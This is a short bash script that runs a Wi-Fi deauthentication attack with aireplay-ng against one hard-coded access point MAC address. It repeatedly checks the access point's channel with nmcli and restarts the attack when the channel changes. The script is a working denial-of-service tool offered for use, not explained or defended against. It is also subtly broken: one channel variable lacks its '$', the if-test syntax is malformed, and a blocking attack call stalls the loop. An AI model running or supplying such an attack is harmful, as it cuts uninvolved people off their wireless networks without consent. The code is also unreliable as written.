#!/bin/bash
# specify the interval for scanning (in seconds)

#how long to wait between channel checks
interval=50
updatedchann=
# target mac address
bssid=E0:A3:AC:F4:C4:1F


#get channel number and store it in variable updatedchann
function getch(){
	#get channel 
	chann=$(nmcli device wifi | grep "$bssid" | awk '{print $4}')
	#update channel
	updatedchann="$chann"
}

#restart the attack with the newly updated channel 
function resetatt(){
	echo "p" | sudo iwconfig wlan0mon channel updatedchann
	
	sudo aireplay-ng -0 3600 -a "$bssid" wlan0mon
}

# enable if restarting networkmanager is needed

#echo "p" | sudo -S airmon-ng check kill
#sleep 10
#sudo service NetworkManager restart	
#sleep 10
#sudo airmon-ng start wlan0mon

getch 
sudo iwconfig wlan0mon channel "$updatedchann"
sudo aireplay-ng -0 3600 -a "$bssid" wlan0mon

#loop that checks channel every $interval
while true
do
	#get channel 
	chann=$(nmcli device wifi | grep "$bssid" | awk '{print $4}')
	#check if channel doesn`t match last time and reset the attack
	if ["$updatedchann" != "$chann"] then
		resetatt
		echo "channel has been updated"
    else
        echo "channel has not changed"
    fi
    # sleep for the specified interval
    sleep "$interval"
done





